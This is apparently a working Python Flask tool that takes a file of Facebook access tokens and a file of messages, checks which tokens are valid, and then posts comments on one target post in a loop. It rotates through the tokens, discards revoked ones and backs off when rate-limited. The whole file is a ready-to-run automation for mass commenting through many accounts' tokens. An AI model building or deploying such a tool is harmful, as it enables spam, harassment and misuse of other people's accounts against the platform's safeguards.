import os, time, collections
from threading import Thread, Event
from flask import Flask, request, render_template_string, jsonify
import requests

app = Flask(__name__)
app.debug = False

# tasks store: task_id -> { thread, stop, tokens(list), messages, logs(deque), meta }
tasks = {}
LOG_MAX = 200  # कितनी log lines रखनी हैं

# ---------- helpers ----------
def read_lines_from_file_storage(fobj):
    """Read uploaded txt file -> list of lines"""
    data = fobj.read()
    if isinstance(data, bytes):
        text = data.decode('utf-8-sig', errors='ignore')
    else:
        text = str(data)
    return [ln.strip() for ln in text.splitlines() if ln.strip()]

def extract_post_id(maybe_url_or_id: str):
    """Post link या raw id से id निकालना"""
    maybe = maybe_url_or_id.strip()
    if maybe.isdigit() or "_" in maybe:
        return maybe
    import re
    digits = re.findall(r'\d{5,}', maybe)
    if digits:
        return digits[-1]
    return maybe

def append_log(task_id, line):
    """Logs में entry डालना"""
    if task_id not in tasks:
        return
    dq = tasks[task_id]["logs"]
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    dq.append(f"[{timestamp}] {line}")
    if len(dq) > LOG_MAX:
        dq.popleft()

def validate_token(token):
    """Quick check if token is valid"""
    try:
        r = requests.get("https://graph.facebook.com/v15.0/me",
                         params={"access_token": token}, timeout=10)
        j = r.json()
        if r.status_code == 200 and "id" in j:
            return True, j
        else:
            return False, j
    except Exception as e:
        return False, {"error": str(e)}

def post_comment(token, post_id, message):
    """FB Graph API से comment करना"""
    url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
    try:
        r = requests.post(url, data={"access_token": token, "message": message}, timeout=15)
    except Exception as e:
        return False, {"error": str(e)}
    try:
        j = r.json()
    except Exception:
        return (r.status_code == 200), {"status_code": r.status_code, "text": r.text[:300]}
    if r.status_code == 200 and "id" in j:
        return True, j
    else:
        return False, j

# ---------- worker ----------
def worker_loop(task_id):
    meta = tasks[task_id]["meta"]
    tokens = tasks[task_id]["tokens"]
    messages = tasks[task_id]["messages"]
    prefix = meta.get("prefix","").strip()
    post_id = meta["post_id"]
    interval = meta.get("interval", 10)
    stop_ev = tasks[task_id]["stop"]

    append_log(task_id, f"Worker started (post_id={post_id}, interval={interval}s, tokens={len(tokens)})")
    msg_idx = 0
    tk_idx = 0
    consecutive_fail = 0

    while not stop_ev.is_set():
        valid_tokens = [t for t in tokens if t.get("valid", True)]
        if not valid_tokens:
            append_log(task_id, "No valid tokens left — stopping task.")
            break

        token_obj = valid_tokens[tk_idx % len(valid_tokens)]
        token = token_obj["token"]

        message = (prefix + " " + messages[msg_idx]).strip()
        ok, resp = post_comment(token, post_id, message)
        if ok:
            append_log(task_id, f"✅ Commented: {message} (id={resp.get('id')})")
            consecutive_fail = 0
        else:
            err = resp.get("error") if isinstance(resp, dict) else resp
            append_log(task_id, f"❌ Failed to comment: {err}")
            consecutive_fail += 1
            if isinstance(resp, dict) and "error" in resp:
                code = resp["error"].get("code")
                msg = resp["error"].get("message","")
                if code == 190 or "OAuthException" in str(msg):
                    token_obj["valid"] = False
                    append_log(task_id, f"🚫 Token invalid: {token[:10]}... ({msg})")
            if consecutive_fail >= 3:
                backoff = min(300, 5 * (2 ** (consecutive_fail-3)))
                append_log(task_id, f"Rate limit → waiting {backoff}s")
                for _ in range(backoff):
                    if stop_ev.is_set(): break
                    time.sleep(1)

        msg_idx = (msg_idx + 1) % len(messages)
        tk_idx = (tk_idx + 1) % max(1, len(tokens))

        for _ in range(int(max(1, interval))):
            if stop_ev.is_set():
                break
            time.sleep(1)

    append_log(task_id, "Worker finished.")
    tasks[task_id]["meta"]["finished"] = True

# ---------- UI / routes ----------
INDEX_HTML = """
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Post Server by Aarav Shrivastava</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { background: linear-gradient(135deg,#2563eb,#1e3a8a); color:#fff; font-family: 'Segoe UI', Roboto, sans-serif; }
    .card { margin:20px auto; max-width:720px; padding:18px; border-radius:14px; background:#fff; color:#111; box-shadow:0 8px 25px rgba(0,0,0,0.25); }
    h3 { color:#1e3a8a; font-weight:700; }
    label { font-weight:600; color:#111827; }
    .muted { color:#6b7280; font-size:0.9rem; }
    footer { text-align:center; margin-top:14px; color:#dbeafe; }
  </style>
</head>
<body>
  <div class="card">
    <h3 class="text-center mb-3">📌 Post Server by Aarav Shrivastava</h3>
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label>Token File (.txt)</label>
        <input type="file" name="tokenFile" class="form-control" required>
        <div class="muted">One token per line</div>
      </div>
      <div class="mb-3">
        <label>Post URL or ID</label>
        <input type="text" name="postId" class="form-control" required>
      </div>
      <div class="mb-3">
        <label>Prefix (optional)</label>
        <input type="text" name="prefix" class="form-control">
      </div>
      <div class="mb-3">
        <label>Delay (seconds)</label>
        <input type="number" name="time" class="form-control" value="10" min="1">
      </div>
      <div class="mb-3">
        <label>Messages File (.txt)</label>
        <input type="file" name="txtFile" class="form-control" required>
      </div>
      <button class="btn btn-primary w-100">🚀 Start Task</button>
    </form>
    <hr>
    <form method="post" action="/stop">
      <label>Stop Task ID</label>
      <input type="text" name="taskId" class="form-control mb-2" required>
      <button class="btn btn-danger w-100">🛑 Stop</button>
    </form>
    <a class="btn btn-outline-secondary w-100 mt-2" href="/status">📊 View Active Tasks</a>
    <div class="mt-3 small muted">
      Developer: Aarav Shrivastava — <a href="https://wa.me/918809494526" target="_blank">WhatsApp</a>
    </div>
  </div>
</body>
</html>
"""

@app.route("/", methods=["GET","POST"])
def index():
    if request.method == "POST":
        token_file = request.files.get("tokenFile")
        txt_file = request.files.get("txtFile")
        post_input = request.form.get("postId","").strip()
        prefix = request.form.get("prefix","").strip()
        try:
            interval = int(request.form.get("time","10"))
        except:
            interval = 10

        if not token_file or not txt_file or not post_input:
            return "Missing fields", 400

        token_lines = read_lines_from_file_storage(token_file)
        tokens = [t for t in token_lines if t]
        if not tokens:
            return "No tokens found", 400

        valid_tokens = []
        for t in tokens:
            ok, _ = validate_token(t)
            if ok: valid_tokens.append(t)

        if not valid_tokens:
            return {"error": "No valid tokens"}, 400

        messages = read_lines_from_file_storage(txt_file)
        if not messages:
            return "Messages file empty", 400

        post_id = extract_post_id(post_input)

        task_id = os.urandom(4).hex()
        stop_ev = Event()
        tasks[task_id] = {
            "thread": None,
            "stop": stop_ev,
            "tokens": [{"token":tok, "valid":True} for tok in valid_tokens],
            "messages": messages,
            "logs": collections.deque(maxlen=LOG_MAX),
            "meta": {"post_id": post_id, "prefix": prefix, "interval": interval,
                     "started_at": time.time(), "finished": False}
        }

        append_log(task_id, f"Task created. tokens={len(valid_tokens)}")
        thread = Thread(target=worker_loop, args=(task_id,), daemon=True)
        tasks[task_id]["thread"] = thread
        thread.start()
        return {"task_id": task_id, "valid_tokens": len(valid_tokens)}

    return render_template_string(INDEX_HTML)

@app.route("/stop", methods=["POST"])
def stop():
    tid = request.form.get("taskId","").strip()
    info = tasks.get(tid)
    if not info:
        return "No such task", 404
    info["stop"].set()
    append_log(tid, "Stop requested by user")
    return f"Stopping {tid}"

@app.route("/status")
def status():
    out = {}
    for k,v in tasks.items():
        out[k] = {
            "alive": v["thread"].is_alive() if v["thread"] else False,
            "post_id": v["meta"].get("post_id"),
            "prefix": v["meta"].get("prefix"),
            "interval": v["meta"].get("interval"),
            "finished": v["meta"].get("finished", False),
            "tokens": len(v["tokens"]),
            "messages": len(v["messages"])
        }
    return jsonify(out)

@app.route("/logs/<task_id>")
def logs(task_id):
    info = tasks.get(task_id)
    if not info:
        return "No such task", 404
    return "<pre>" + "\n".join(list(info["logs"])) + "</pre>"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
